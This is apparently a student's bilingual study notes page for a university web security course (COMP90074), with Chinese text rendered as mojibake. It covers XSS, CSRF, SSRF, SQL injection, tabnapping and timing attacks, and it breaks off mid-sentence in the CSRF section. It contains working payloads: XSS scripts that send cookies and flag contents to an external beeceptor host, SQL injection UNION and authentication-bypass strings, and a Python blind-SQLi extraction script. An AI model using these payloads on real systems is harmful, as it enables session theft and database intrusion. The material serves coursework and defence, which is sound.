Request Forgery (SSRF) æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ </span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#data-exfiltration-%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2"><span class="toc-number">1.7.0.1.</span> <span class="toc-text">Data Exfiltration æ•°æ®æ³„éœ²</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%AE%9A%E4%B9%89-2"><span class="toc-number">1.7.0.1.0.1.</span> <span class="toc-text">å®šä¹‰</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%B9%E6%8D%AE%E6%B3%84%E6%BC%8F%E7%9A%84dynamic-url-parameter%E5%8F%91%E8%B5%B7%E4%BC%AA%E9%80%A0%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82"><span class="toc-number">1.7.0.2.</span> <span class="toc-text">æ ¹æ®æ³„æ¼çš„Dynamic
URL &amp; Parameterå‘èµ·ä¼ªé€ æœåŠ¡ç«¯è¯·æ±‚</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#exploit-7"><span class="toc-number">1.7.0.2.0.1.</span> <span class="toc-text">Exploit</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#remote-code-execution-rce-%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81"><span class="toc-number">1.7.0.3.</span> <span class="toc-text">Remote Code
Execution (RCE) è¿œç¨‹æ‰§è¡Œä»£ç </span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#authorisation-vs-authentication"><span class="toc-number">1.8.</span> <span class="toc-text">Authorisation vs
Authentication</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#serialisation-vs-deserialisation"><span class="toc-number">1.9.</span> <span class="toc-text">Serialisation vs
Deserialisation</span></a></li></ol></li></ol></div> -->
    <h1 id="comp90074-web-security-ç½‘ç»œå®‰å…¨">COMP90074 Web Security
ç½‘ç»œå®‰å…¨</h1>
<h2 id="åŸºç¡€">åŸºç¡€</h2>
<h4 id="owasp-top-10-web-vulnerabilities-2017">OWASP Top 10 web
vulnerabilities (2017)</h4>
<ol type="1">
<li>Injection</li>
<li>Broken Authentication</li>
<li>Sensitive Data Exposure</li>
<li>XML External Entities (XEE)</li>
<li>Broken Access Control</li>
<li>Security Misconfiguration</li>
<li>Cross-Site Scripting (XSS)</li>
<li>Insecure Deserialization</li>
<li>Using Component with Known Vulnerabilities</li>
<li>Insufficient Logging &amp; Monitoring</li>
</ol>
<h4 id="terminology">Terminology</h4>
<blockquote>
<table>
<colgroup>
<col style="width: 48%" />
<col style="width: 51%" />
</colgroup>
<thead>
<tr class="header">
<th>Term</th>
<th>Des</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Server æœåŠ¡å™¨</td>
<td>-</td>
</tr>
<tr class="even">
<td>Clinet å®¢æˆ·ç«¯</td>
<td>-</td>
</tr>
<tr class="odd">
<td>Connection è¿æ¥</td>
<td>ç½‘ç»œé€šä¿¡æ–¹å¼</td>
</tr>
<tr class="even">
<td>Internet å› ç‰¹ç½‘</td>
<td>-</td>
</tr>
<tr class="odd">
<td><strong>Network Interface Card ç½‘ç»œæ¥å£å¡Â (NIC)</strong></td>
<td>ç¡¬ä»¶é€‚é…å™¨, è¿æ¥ç½‘ç»œä¸ºä¸»æœºè·å–<u>PacketsåŒ…</u></td>
</tr>
<tr class="even">
<td><strong>Spoof æ¬ºéª—</strong></td>
<td>ä¼ªè£…æˆå…¶ä»–äºº</td>
</tr>
<tr class="odd">
<td><strong>Protocol åè®®</strong></td>
<td>è½¯ä»¶å¿…é¡»éµå®ˆçš„<u>Set of Rulesä¸€ç³»åˆ—è§„åˆ™</u></td>
</tr>
</tbody>
</table>
</blockquote>
<h4 id="permission-æƒé™">Permission æƒé™</h4>
<blockquote>
<p><em>é“å¾·</em>ä¸ä¸é“å¾·çš„ä¸»è¦åŒºåˆ«å°±æ˜¯æ˜¯å¦ä¾æ® <strong>Vulnerability
Disclosure Policy (VDP) æ¼æ´æŠ«éœ²æ”¿ç­–</strong></p>
<blockquote>
<p>é—®:
æ˜¯ä¸æ˜¯æœ‰<strong>VDP</strong>å°±ä»£è¡¨è¢«èµ‹äºˆäº†çº°æ¼<strong>Promissionæƒé™</strong>ï¼Ÿ</p>
</blockquote>
<p>ä¾ç…§<strong>VDP</strong>è¿›è¡Œçš„<u>æ¼æ´æ‰¹æ¼</u>æ‰ç®—æ˜¯<em>é“å¾·çš„</em>,
åŒæ—¶éœ€è¦æŒ‰ç…§<strong>VPD</strong>ç»™å‡ºçš„:</p>
<ol type="1">
<li><u>How</u>å¦‚ä½•çº°æ¼æ¼æ´</li>
<li><u>When</u>ä»€ä¹ˆæ—¶é—´å…è®¸</li>
<li><u>Scope</u>æµ‹è¯•èŒƒå›´</li>
</ol>
<p><strong>VDPæ ¼å¼</strong></p>
<ol type="1">
<li>Guidelines å‡†åˆ™</li>
<li>Host on the Company / Departmentâ€™s website or resources</li>
<li>Scope å…è®¸æµ‹è¯•èŒƒå›´</li>
<li>Exclusions ä¸èƒ½æµ‹è¯•çš„</li>
<li>Expectations of handling æœŸæœ›ä½ å¦‚ä½•åš (ä¾‹å¦‚)</li>
<li>A Way to Contact the organisation ç»„ç»‡è”ç³»æ–¹å¼</li>
</ol>
</blockquote>
<h4 id="html-events">HTML Events</h4>
<blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">element</span> <span class="attr">event</span>=<span class="string">&#x27;some JavaScript&#x27;</span>&gt;</span> <span class="comment">&lt;!--è°ƒç”¨JS--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">on</span> <span class="attr">click</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span>Alert!<span class="tag">&lt;/<span class="name">button</span>&gt;</span> <span class="comment">&lt;!--ç‚¹å‡»ç›¸åº”--&gt;</span></span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr class="header">
<th>æ—¶é—´</th>
<th>è§£é‡Š</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>onchange</code></td>
<td>html element è¢«æ”¹å˜</td>
</tr>
<tr class="even">
<td><code>onclick</code></td>
<td>ç‚¹å‡»æ—¶é—´</td>
</tr>
<tr class="odd">
<td><code>onmouseover</code></td>
<td>é¼ æ ‡æ‚¬åœhtml element</td>
</tr>
<tr class="even">
<td><code>onmouseout</code></td>
<td>é¼ æ ‡ç¦»å¼€html element</td>
</tr>
<tr class="odd">
<td><code>onkeydown</code></td>
<td>æŒ‰é”®ç›˜</td>
</tr>
<tr class="even">
<td><code>onload</code></td>
<td>æµè§ˆå™¨åŠ è½½</td>
</tr>
<tr class="odd">
<td><code>onerror</code></td>
<td>é”™è¯¯: ä¾‹å¦‚å›¾ç‰‡æ— æ³•åŠ è½½</td>
</tr>
</tbody>
</table>
</blockquote>
<h4 id="http-cookies-ä¿¡æ¯è®°å½•ç¨‹åº">HTTP Cookies ä¿¡æ¯è®°å½•ç¨‹åº</h4>
<blockquote>
<ol type="1">
<li><p>Tracking</p></li>
<li><p>Authentication é‰´å®š</p>
<ul>
<li>identify whether user is logged in è¯†åˆ«ç”¨æˆ·æ˜¯å¦å·²ç™»å½•</li>
</ul></li>
<li><p>Security Measures</p>
<ul>
<li><table>
<colgroup>
<col style="width: 13%" />
<col style="width: 86%" />
</colgroup>
<thead>
<tr class="header">
<th>Attribute</th>
<th>Definition</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>HTTPOnly</td>
<td>JS cannot access it <br>unless the browser has vulnerabilities</td>
</tr>
<tr class="even">
<td>Secure</td>
<td>Must be send over SSL/TLS</td>
</tr>
<tr class="odd">
<td>Expires</td>
<td>ç”¨æˆ·ç«¯cookieè¢«åˆ é™¤çš„æ—¶é—´</td>
</tr>
<tr class="even">
<td>Domain</td>
<td>åŸŸ domain is relates to, <br>e.g. â€˜google.comâ€™</td>
</tr>
<tr class="odd">
<td>Path</td>
<td>ç½‘ç«™åº”ç”¨ä¸­çš„è·¯å¾„</td>
</tr>
</tbody>
</table></li>
</ul></li>
</ol>
<blockquote>
<p>If the Expiry is not set, or is set to â€œSessionâ€, the browser will
remove the cookie upon closing
å¦‚æœ<u>æœªè®¾ç½®</u>åˆ°æœŸ<u>æˆ–è®¾ç½®ä¸º"Session"</u>ï¼Œ<u>æµè§ˆå™¨å°†åœ¨å…³é—­æ—¶åˆ é™¤cookie</u>.</p>
</blockquote>
<blockquote>
<p>Cookie Expiry
å¿…é¡»åœ¨<strong>å®¢æˆ·ç«¯</strong>å’Œ<strong>æœåŠ¡å™¨ç«¯</strong>å®Œæˆ,
<u>ä¸¤ç«¯å®Œæˆ</u>ã€‚</p>
</blockquote>
<blockquote>
<p>å¦‚æœ<strong>æœåŠ¡å™¨</strong><u>æœªæ­£ç¡®ç»ˆæ­¢</u> Cookieï¼Œåˆ™å…·æœ‰ Cookie
å€¼çš„ä»»ä½•äººéƒ½å¯ä»¥ä½¿ç”¨å®ƒä½œä¸ºæ‚¨çš„ç”¨æˆ·è¿›è¡Œèº«ä»½éªŒè¯ã€‚</p>
</blockquote>
</blockquote>
<h4 id="domain-name-service-dns-åŸŸåæœåŠ¡ç³»ç»Ÿ">Domain Name Service (DNS)
åŸŸåæœåŠ¡ç³»ç»Ÿ</h4>
<blockquote>
<p>DNSç±»ä¼¼äºä¸€ä¸ªç”µè¯é»„é¡µ, å­˜å‚¨ç€åŸŸåå¯¹åº”çš„IPåœ°å€ï¼Œ
DNSä½¿ç”¨ä¸æ’åºçš„UDPåŒ…è£¹ <u>Unordered UDP packets</u>,
å¹¶ä¸”æ˜¯<u>ä¸åŠ å¯†</u>çš„ã€‚</p>
<p><strong>DNS Records Type</strong>:</p>
<table>
<thead>
<tr class="header">
<th>Type</th>
<th>Des</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>A</td>
<td>Address Record</td>
</tr>
<tr class="even">
<td>AAAA</td>
<td>IPv6 Address Record</td>
</tr>
<tr class="odd">
<td>CNAME</td>
<td>Canonical Record Name è§„èŒƒåç§°è®°å½•</td>
</tr>
<tr class="even">
<td>MX</td>
<td>Mail Exchange Record å­˜å‚¨é‚®ä»¶äº¤æ¢</td>
</tr>
<tr class="odd">
<td>TXT</td>
<td>Text Record å­˜å‚¨æ–‡å­—</td>
</tr>
<tr class="even">
<td>NS</td>
<td>Name Server Record</td>
</tr>
</tbody>
</table>
</blockquote>
<h4 id="asynchronouså¼‚æ­¥-javascript-and-xml-ajax">Asynchronouså¼‚æ­¥
JavaScript And XML (AJAX)</h4>
<blockquote>
<ol type="1">
<li>åå°è¯·æ±‚åœ¨<u>æµè§ˆå™¨ä¸­è¿è¡Œ</u></li>
<li>ä½¿ Webåº”ç”¨ç¨‹åºæ›´å…·<u>äº¤äº’æ€§</u></li>
</ol>
</blockquote>
<p><img src="https://raw.githubusercontent.com/ZhidongZhou/gallery/master/img/iShot2022-03-03 15.18.01.png" alt="iShot2022-03-03 15.18.01" style="zoom:50%;" /></p>
<h4 id="document-object-model-dom-æ–‡æ¡£å¯¹è±¡æ¨¡å‹">Document Object Model
(DOM) æ–‡æ¡£å¯¹è±¡æ¨¡å‹</h4>
<blockquote>
<p>parsing è§£æ HTML å’Œ XML</p>
<p>Object-oriented representation of web pages ç½‘é¡µçš„é¢å‘å¯¹è±¡è¡¨ç¤º</p>
<p>can be controoled by scripting languages like <em>JavaScript</em></p>
</blockquote>
<h2 id="xss-vs-csrf-vs-ssrf">XSS vs CSRF vs SSRF</h2>
<table>
<colgroup>
<col style="width: 7%" />
<col style="width: 30%" />
<col style="width: 30%" />
<col style="width: 30%" />
</colgroup>
<thead>
<tr class="header">
<th></th>
<th>XSS</th>
<th>CSRf</th>
<th>SSRF</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><strong>Definition</strong></td>
<td>å…è®¸æ”»å‡»è€…åœ¨å—å®³ç”¨æˆ·çš„æµè§ˆå™¨ä¸­æ‰§è¡Œä»»æ„ Javascript</td>
<td>è¯±éª—<u>ç”¨æˆ·</u>æ‰§è¡Œæ¶æ„è¯·æ±‚<br>ç½‘ç«™è¢«æ”»å‡»è€…æ§åˆ¶<br>ç”¨æˆ·å¿…é¡»ç»è¿‡èº«ä»½éªŒè¯</td>
<td><strong>æœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ </strong>:
æ¬ºéª—<u>æœåŠ¡å™¨</u>ä»£è¡¨æ”»å‡»è€…æ‰§è¡Œæœªç»æˆæƒçš„è¯·æ±‚</td>
</tr>
<tr class="even">
<td><strong>Mitigation</strong></td>
<td>æ­£åˆ™è¡¨è¾¾å¼æˆ–å­—ç¬¦ä¸²ç­›é€‰<br/>WAF<br/>HTML Encoding<br/>Content
Security Policy</td>
<td>å…·æœ‰é«˜ç†µçš„ CSRF ä»¤ç‰Œ,
ç»‘å®šåˆ°ç”¨æˆ·çš„ä¼šè¯<br>Referrer<br><strong>CORSè·¨åŸŸèµ„æºå…±äº«</strong>:
æµè§ˆå™¨â½¤äºé™åˆ¶ä¸å…¶ä»–â½¹ç«™äº¤äº’çš„æœºåˆ¶, æŠµå¾¡æ¶æ„ AJAX
è¯·æ±‚,å…è®¸â½¹ç«™æŒ‡å®šè°å¯ä»¥ä½¿â½¤ AJAX</td>
<td>å°†åŸŸåè§£æåˆ—â¼Šâ½©åå•<br/><br/>é‡æ–°è¯„ä¼°<strong>Egress
Ruleå‡ºâ¼è§„åˆ™</strong><br/><br/>ç¦â½¤æœªä½¿â½¤çš„ URL
æ¶æ„<br/><br/>å°†åº”â½¤ç¨‹åºå¯è®¿é—®çš„æœåŠ¡åˆ—â¼Šâ½©åå•ï¼ˆä¸å…è®¸ä½¿â½¤ AWS
å…ƒæ•°æ®ç­‰æ•æ„Ÿç»ˆç«¯èŠ‚ç‚¹ï¼‰</td>
</tr>
</tbody>
</table>
<h2 id="timing-attacks">Timing Attacks</h2>
<blockquote>
<p>å®šæ—¶æ”»å‡»æ˜¯å—è¿‡æ•™è‚²çš„åŸºäºè›®â¼’çš„æ”»å‡», ç±»ä¼¼äºSQLi</p>
</blockquote>
<h6 id="exploit">Exploit</h6>
<ol type="1">
<li>é€šè¿‡ <strong>brute-force è›®åŠ›æ³•</strong>ç ´è§£å¯†ç </li>
<li>ä½¿ç”¨ Burp-suite intercept æ¥è·å°è¯•ç™»å½•å¯†ç çš„è¯·æ±‚</li>
<li>é€šè¿‡ Burp-suite intruder, é‡æ”¾è®²å¯†ç çš„ç¬¬1ä½è®¾ç½®ä¸ºå˜é‡</li>
<li>ç„¶åå¯¼å…¥ Character Set: <code>&#123;a-z, A-Z, 0-9&#125;</code></li>
<li>æ ¹æ®ä»<u>Server æœåŠ¡å™¨</u>, <strong>Response Received
æ”¶åˆ°å›å¤</strong> çš„æ—¶é—´åˆ¤æ–­å“ªä¸€ä¸ª <strong>character å­—ç¬¦</strong>
æ˜¯æ­£ç¡®çš„</li>
<li>ç„¶åä¾æ¬¡ç±»æ¨åˆ°ç¬¬2ä½, ç¬¬ä¸‰ä½ã€‚</li>
</ol>
<h2 id="xss">XSS</h2>
<h6 id="impact">Impact</h6>
<ol type="1">
<li>Steal cookie</li>
<li>Steal DOM</li>
<li>Steal Local Storage</li>
<li>æ“çºµ AJAX è°ƒç”¨ä»¥æ‰§è¡Œæœªç»æˆæƒçš„æ“ä½œ</li>
</ol>
<h6 id="remediation">Remediation</h6>
<blockquote>
<p>ä¸è¦ä½¿ç”¨é»‘åå• Blacklist</p>
</blockquote>
<ol type="1">
<li>Filter using regex</li>
<li>WAF (ä¸æ˜¯é˜²å¾¡æœºåˆ¶, è€Œæ˜¯é¢å¤–çš„ä¿æŠ¤å±‚)
<ul>
<li>é€šè¿‡è¿‡æ»¤æ¶æ„è¡Œä¸ºæ¥é˜²èŒƒæ¼æ´, æœ‰åŠ©äºé˜²æ­¢éš¾ä»¥ä¿®è¡¥çš„æ¼æ´</li>
</ul></li>
<li>HTML ç¼–ç : å°†ä¿¡æ¯ä»ä¸€ä¸ªå­—ç¬¦è¡¨ç¤ºå½¢å¼è½¬æ¢ä¸ºå¦ä¸€ä¸ªå­—ç¬¦è¡¨ç¤ºå½¢å¼
<ul>
<li>URL</li>
<li>HTML</li>
<li>Base64</li>
</ul></li>
<li>Content Security Policy (CSP) å†…å®¹å®‰å…¨æ”¿ç­–
<ul>
<li>æœåŠ¡å™¨å¼ºåˆ¶å®æ–½çš„å®‰å…¨æœºåˆ¶</li>
<li>æµè§ˆå™¨ä½¿ç”¨æœåŠ¡å™¨çš„è§„èŒƒè¿›è¡Œç¼–è¯‘</li>
<li>å£°æ˜å·²æ‰¹å‡†çš„å†…å®¹æ¥æº</li>
<li>ç”¨äºä¸æ–­ç¼“è§£ XSS</li>
</ul></li>
<li>X-XSS ä¿æŠ¤æ ‡å¤´
<ul>
<li>ç”±æœåŠ¡å™¨å¼ºåˆ¶æ‰§è¡Œ</li>
<li>æµè§ˆå™¨è¯•å›¾éµå®ˆ</li>
<li>ç”¨äºè¦æ±‚æµè§ˆå™¨å¼ºåˆ¶å®æ–½ XSS å®¡æ ¸å‘˜ä¿æŠ¤</li>
<li>åœ¨æ²™ç›’ä¸­åŠ è½½</li>
<li>ä¸å†å­˜åœ¨äº Chrome å’Œ Firefox ä¸­ã€‚</li>
</ul></li>
</ol>
<h4 id="stored-xss">Stored XSS</h4>
<h6 id="exploit-1">Exploit</h6>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="comment">// 1. Define Variable use XHR to connect browser with server.</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> XHR = <span class="keyword">new</span> XMLHttpRequest(); </span></span><br><span class="line"><span class="javascript">    <span class="comment">// 2. get cookie from the GET request</span></span></span><br><span class="line"><span class="javascript">    XHR.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;https://zhidongz.free.beeceptor.com/?cookie=&quot;</span> + <span class="built_in">document</span>.cookie, <span class="literal">true</span>);</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 3.Send Request</span></span></span><br><span class="line"><span class="javascript">    XHR.send(); </span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> XHR_OUTTER = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="javascript">    XHR_OUTTER.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span> (XHR_OUTTER.readyState == <span class="number">4</span> &amp;&amp; XHR_OUTTER.status == <span class="number">200</span>) &#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> XHR_INNER = <span class="keyword">new</span> XMLHttpRequest()</span></span><br><span class="line"><span class="javascript">            XHR_INNER.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;https://zhidongz.free.beeceptor.com/?cookie=&quot;</span> + XHR_OUTTER.responseText, <span class="literal">true</span>)</span></span><br><span class="line"><span class="javascript">            XHR_INNER.send()</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript">    XHR_OUTTER.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;flag.php&quot;</span>, <span class="literal">true</span>)</span></span><br><span class="line"><span class="javascript">    XHR_OUTTER.send()</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="dom-based-xss">DOM-Based XSS</h4>
<h6 id="exploit-2">Exploit</h6>
<ol type="1">
<li><code>&lt;script&gt;window.location.href="https://zhidongz.free.beeceptor.com?cookie="+document.domain;&lt;/script&gt;</code></li>
<li><code>&lt;script&gt;window.location.href="&#123;target_url&#125;"&lt;/script&gt;</code></li>
</ol>
<h4 id="http-parameter-pollution-å‚æ•°æ±¡æŸ“">HTTP Parameter Pollution
å‚æ•°æ±¡æŸ“</h4>
<h6 id="å®šä¹‰">å®šä¹‰</h6>
<blockquote>
<p>å¯¼è‡´åº”ç”¨ç¨‹åºè¯¯è§£æä¾›çš„å‚æ•°, å¯ä»¥ä½¿ç”¨å®ƒç»•è¿‡è¾“å…¥éªŒè¯</p>
</blockquote>
<h4 id="tabnapping-æµè§ˆå™¨åˆ†é¡µç»‘æ¶">Tabnapping æµè§ˆå™¨åˆ†é¡µç»‘æ¶</h4>
<h6 id="å®šä¹‰-1">å®šä¹‰</h6>
<blockquote>
<p>åœ¨ç½‘ç»œæµè§ˆå™¨ä¸­ç»‘æ¶ Tabåˆ†é¡µ,
å…è®¸æ”»å‡»è€…æ‰“å¼€å…³é—­åˆ†é¡µå’Œæ›´æ”¹æ ‡ç­¾é¡µè·³è½¬çš„URLåœ°å€</p>
</blockquote>
<h6 id="exploit-3">Exploit</h6>
<ol type="1">
<li>æ‰¾åˆ°: `<code>target="_blank_"</code> (è¿‡æ—¶çš„æ–¹æ³•)</li>
<li>æ‰“å¼€: <code>window.opener.location.replace("&#123;URL&#125;")</code></li>
<li>å…³é—­: <code>window.opener.close()</code></li>
</ol>
<h6 id="impact-1">Impact</h6>
<blockquote>
<p>é£é™©çº§åˆ«: ä½</p>
</blockquote>
<h6 id="remediation-1">Remediation</h6>
<ol type="1">
<li>ä¸è¦ç”¨: `<code>target="_blank_"</code></li>
<li>ä½¿ç”¨: `rel="nofollow noopener noreferrer" target="_blank"</li>
<li>æˆ–è€…: <code>target="_parent"</code></li>
</ol>
<h4 id="clickjacking-ç‚¹å‡»åŠ«æŒ">Clickjacking ç‚¹å‡»åŠ«æŒ</h4>
<blockquote>
<p>å°† UI å åŠ åœ¨ç›®æ ‡ Web åº”ç”¨ç¨‹åºä¹‹ä¸Š, ä»¥ä¾¿åœ¨æœªç»æˆæƒçš„æƒ…å†µä¸‹æ‰§è¡Œæ“ä½œ</p>
</blockquote>
<h6 id="impact-2">Impact</h6>
<blockquote>
<p>éå¸¸å…·æœ‰æ¬ºéª—æ€§, ä½†å½±å“ä¸ä¸¥é‡</p>
</blockquote>
<h4 id="subdomain-takeovers">Subdomain Takeovers</h4>
<h2 id="sqli"><a
target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection">SQLi</a></h2>
<h4 id="sqlä¸¤ç§comment">SQLä¸¤ç§Comment</h4>
<ol type="1">
<li><code>--+</code></li>
<li><code>#</code></li>
</ol>
<h4 id="sql-injection-union-attacks"><a
target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/union-attacks">SQL
injection UNION attacks</a></h4>
<h6 id="get-database-version">Get Database Version</h6>
<p><code>UNION SELECT 1,2,@@VERSION--+</code></p>
<h6 id="get-schema-name">GET Schema Name</h6>
<ol type="1">
<li><code>'UNION SELECT 1,2,schema()--+</code></li>
<li><code>'UNION SELECT 1,2,database()--+</code></li>
</ol>
<h6 id="get-table-name">Get Table Name</h6>
<p><code>'UNION SELECT 1,TABLE_NAME,2,3 FROM INFORMATION_SCHEMA.TABLES--+</code></p>
<h6 id="get-string-value">Get String Value</h6>
<p><code>' UNION SELECT 1,string,3,4 FROM Secure.Flag--+</code></p>
<h6 id="retrieve-multiple-values-in-a-single-column">Retrieve Multiple
Values in a Single Column</h6>
<p><code>' UNION SELECT NULL, &#123;column_name_1&#125; ||'&#123;é“¾æ¥ç¬¦&#125;'||&#123;column_name_2&#125; FROM &#123;table_name&#125; --</code></p>
<h4 id="authentication-bypass-with-limit">Authentication Bypass with
<code>LIMIT</code></h4>
<h6 id="exploit-4">Exploit</h6>
<ol type="1">
<li>python:
<ul>
<li>```python payload = "SELECT * FROM {table_name} WHERE
{column_name}='"+request.args['{column_name}']+"'AND
{target_column_name}='" + request.args['{target_column_name}'] + "';"
<figure class="highlight dust"><table><tr><td class="code"><pre><span class="line"><span class="xml">2. URL:</span></span><br><span class="line"><span class="xml">   - ```html</span></span><br><span class="line"><span class="xml">     https://</span><span class="template-variable">&#123;url&#125;</span><span class="xml">/</span><span class="template-variable">&#123;dynamic_url&#125;</span><span class="xml">?</span><span class="template-variable">&#123;param&#125;</span><span class="xml">=text&#x27; or 1=1 LIMIT 1-- &amp;password=password</span></span><br></pre></td></tr></table></figure></li>
</ul></li>
<li>SQLi:
<ul>
<li>```sql SELECT * FROM {table_name} WHERE
{column_name}='{known_value}' or 1=1 LIMIT 1--' AND {target_column_name}
= '{changed_value}'; <figure class="highlight clean"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">#### [Blind SQLi](https:<span class="comment">//portswigger.net/web-security/sql-injection/blind)</span></span><br><span class="line"></span><br><span class="line">&gt; [Cheat Sheet](https:<span class="comment">//portswigger.net/web-security/sql-injection/cheat-sheet)</span></span><br><span class="line"></span><br><span class="line">###### Exploit</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> Payload: `SELECT &#123;column_name&#125; FROM &#123;table_name&#125; WHERE &#123;column_name&#125; = <span class="string">&#x27;&#123;Password&#125;&#x27;</span> UNION SELECT <span class="number">1</span> <span class="keyword">from</span> users <span class="keyword">where</span> username = <span class="string">&#x27;administrator&#x27;</span> and <span class="keyword">if</span>(SUBSTRING(password,&#123;i&#125;,<span class="number">1</span>) = <span class="string">&#x27;&#123;char&#125;&#x27;</span>, sleep(<span class="number">3</span>), sleep(<span class="number">0</span>))--`</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> Python:</span><br><span class="line"></span><br><span class="line">   <span class="number">1.</span> ```python</span><br><span class="line">      <span class="keyword">import</span> requests</span><br><span class="line">      <span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote # URL ENCODING</span><br><span class="line">      # AUTHENTICATION</span><br><span class="line">      session = requests.session()</span><br><span class="line">      url = <span class="string">&quot;http://&#123;domain_url&#125;/auth.php&quot;</span></span><br><span class="line">      credential = &#123;<span class="string">&quot;user&quot;</span>: <span class="string">&quot;&#123;username&#125;&quot;</span>, <span class="string">&quot;pass&quot;</span>: <span class="string">&quot;&#123;password&#125;&quot;</span>&#125;</span><br><span class="line">      # ESTABLISH CONNECTION </span><br><span class="line">      session.post(url, data=credential)</span><br><span class="line">      # CHARACTER SET</span><br><span class="line">      chars = <span class="string">&quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!\&quot;#()*+,-./:;&lt;=&gt;?@&#123;&#125;~[\]$%&amp;&#x27;^_`&quot;</span></span><br><span class="line">      target = []</span><br><span class="line">      for i <span class="keyword">in</span> range(&#123;range_str&#125;, &#123;range_end&#125;):</span><br><span class="line">          for char <span class="keyword">in</span> chars:</span><br><span class="line">              payload = f<span class="string">&quot;&#x27;UNION SELECT 1,2,3 FROM (SELECT GROUP_CONCAT(&#123;COLUMN_NAME&#125;) AS val FROM Secure.&#123;TABLE_NAME&#125; WHERE &#123;TARGET_COLUMN_NAME&#125; LIKE &#x27;%&#123;KNOWN_VALUE&#125;%&#x27;) AS tables WHERE BINARY SUBSTRING(val,&#123;i&#125;,1)=&#x27;&#123;char&#125;&#x27;;#&quot;</span></span><br><span class="line">              respond = session.get(<span class="string">&quot;http://&#123;domain_url&#125;/&#123;dynamic_url&#125;?&#123;param&#125;=&quot;</span>+quote(payload)) # URL ENCODING</span><br><span class="line">              <span class="keyword">if</span> respond.text == <span class="string">&#x27;true&#x27;</span>:</span><br><span class="line">                  target.append(char)</span><br><span class="line">                  print(<span class="string">&quot;Currnet: &quot;</span>, <span class="string">&quot;&quot;</span>.join(target))</span><br><span class="line">                  break</span><br><span class="line">      print(<span class="string">&quot;RESULT: &quot;</span>,<span class="string">&quot;&quot;</span>.join(target))</span><br></pre></td></tr></table></figure></li>
</ul></li>
</ol>
<h6 id="mitigation">Mitigation</h6>
<ol type="1">
<li>Prepared Statements</li>
<li>Stored Procedures</li>
<li>White List Input Validation</li>
<li>Escaping User Input</li>
<li>WAF</li>
<li>Blacklisting Input</li>
</ol>
<h4 id="sql-wildcard-attack">SQL Wildcard Attack</h4>
<h6 id="exploit-5">Exploit</h6>
<ol type="1">
<li>ç”¨ <strong>ä¸‹åˆ’çº¿ <code>_</code></strong> æˆ–è€…
<strong>ç™¾åˆ†å·<code>%</code></strong></li>
<li>æˆ–è€…<strong>åŒç™¾åˆ†å·</strong>:
<code>SELECT &#123;column_name&#125; FROM &#123;table_name&#125; WHERE &#123;column_name&#125; = '%%'</code></li>
<li>æ³¨æ„æ³¨å…¥è¯­å¥(Payload), éœ€è¦é¢„å…ˆé€šè¿‡URL Encoding:
<code>%25</code></li>
</ol>
<h2 id="cross-site-request-forgery-è·¨ç«™ç‚¹è¯·æ±‚ä¼ªé€ -csrf">Cross-Site
Request Forgery è·¨ç«™ç‚¹è¯·æ±‚ä¼ªé€  (CSRF)</h2>
<h6 id="mitigation-1">Mitigation</h6>
<ol type="1">
<li><strong>CSRFä»¤ç‰Œ</strong>:ä¸å¯é¢„æµ‹çš„é«˜ç†µ,
ä¸ä¸€èˆ¬çš„ä¼šè¯ä»¤ç‰Œä¸€æ ·ã€‚ç»‘å®šåˆ°ç”¨æˆ·çš„ä¼šè¯ åœ¨æ‰§è¡Œç›¸å…³æ“ä½œä¹‹å‰,
